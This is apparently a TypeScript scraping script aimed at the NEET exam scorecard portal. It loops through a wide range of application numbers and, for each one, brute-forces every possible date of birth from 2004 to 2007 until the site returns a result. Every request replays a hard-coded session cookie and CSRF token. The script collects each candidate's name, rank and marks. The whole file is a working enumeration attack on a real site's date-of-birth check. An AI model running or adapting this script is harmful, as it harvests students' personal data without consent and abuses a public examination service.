import axios from "axios";
import qs from "qs";
import Cheerio from "cheerio";

async function solve(
  applicationNumber: string,
  day: string,
  month: string,
  year: string
) {
  let data = qs.stringify({
    "_csrf-frontend":
      "MAbSLhs1rvp-9_pesU7dZcHuXiryDbTo74PlX3xtQiVxRYpCL2z-rlOvtwbYf7U2nqwEXqFB2JqG7NEYKgNyYw==",
    "Scorecardmodel[ApplicationNumber]": applicationNumber,
    "Scorecardmodel[Day]": day,
    "Scorecardmodel[Month]": month,
    "Scorecardmodel[Year]": year,
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "https://neet.ntaonline.in/frontend/web/scorecard/index",
    headers: {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
      "Accept-Language": "en-GB,en;q=0.9",
      "Cache-Control": "max-age=0",
      Connection: "keep-alive",
      "Content-Type": "application/x-www-form-urlencoded",
      Cookie:
        "advanced-frontend=pjn154gn7ngjq5g50vonaec211; _csrf-frontend=00e7d6979df3b49bf8d5a8a185a2d4700d0643c5d197c3018bb4877e0f3a11a3a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22ACXl4YPT-XMXi1hS_BZtSLlrio4GVn0F%22%3B%7D",
      Origin: "null",
      "Sec-Fetch-Dest": "document",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-User": "?1",
      "Sec-GPC": "1",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent":
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      "sec-ch-ua": '"Brave";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"macOS"',
    },
    data: data,
  };

  try {
    const response = await axios.request(config);
    const parsedData = parseHTML(JSON.stringify(response.data));
    return parsedData;
  } catch (error) {
    return null;
  }
}

function parseHTML(htmlContent: string) {
  const $ = Cheerio.load(htmlContent);
  const applicationNumber =
    $('td:contains("Application No.")').next("td").text().trim() || "N/A";
  const candidateName =
    $('td:contains("Candidate’s Name")').next("td").text().trim() || "N/A";
  const AllIndiaRank =
    $('td:contains("NEET All India Rank")').next("td").text().trim() || "N/A";
  const Marks =
    $('td:contains("Total Marks Obtained (out of 720)")')
      .first()
      .next("td")
      .text()
      .trim() || "N/A";

  //   console.log({
  //     applicationNumber,
  //     candidateName,
  //     AllIndiaRank,
  //     Marks,
  //   });

  if (AllIndiaRank === "N/A") {
    return null;
  }

  return {
    applicationNumber,
    candidateName,
    AllIndiaRank,
    Marks,
  };
}

async function main(rollNumber: string) {
  let solved = false;
  for (let year = 2007; year >= 2004; year--) {
    if (solved) {
      break;
    }

    for (let month = 1; month <= 12; month++) {
      if (solved) {
        break;
      }

      const DataPromises = [];
      console.log(`Processing ${month} and ${year}`);

      for (let day = 1; day <= 31; day++) {
        const dataPromise = solve(
          rollNumber,
          day.toString(),
          month.toString(),
          year.toString()
        );
        DataPromises.push(dataPromise);
      }

      const resolvedData = await Promise.all(DataPromises);
      resolvedData.forEach((data) => {
        if (data) {
          console.log(data);
          solved = true;
        }
      });
    }
  }
}

async function solveAllApplications() {
  for (let i = 240411345673; i < 240411999999; i++) {
    console.log(`Processing ${i}`);
    await main(i.toString());
  }
}

solveAllApplications();
